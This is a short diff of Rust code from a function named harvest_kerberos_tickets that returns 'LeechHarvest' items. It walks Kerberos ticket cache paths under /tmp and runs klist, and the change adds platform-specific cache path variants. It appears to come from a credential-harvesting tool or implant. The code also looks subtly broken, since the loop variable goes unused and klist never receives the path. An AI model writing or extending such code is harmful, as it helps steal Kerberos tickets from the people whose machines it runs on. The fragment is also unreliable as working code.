@@ -55,7 +55,10 @@ fn harvest_kerberos_tickets() -> Vec<LeechHarvest> {
     // Linux: check for krb5 ticket cache
     for _cache_path in &[
         "/tmp/krb5cc_*",
+        #[cfg(target_os = "linux")]
         &format!("/tmp/krb5cc_{}", unsafe { libc::getuid() }),
+        #[cfg(not(target_os = "linux"))]
+        &format!("/tmp/krb5cc_{}", std::process::id()),
     ] {
         if let Ok(out) = Command::new("klist").arg("-c").output() {
             let text = String::from_utf8_lossy(&out.stdout);
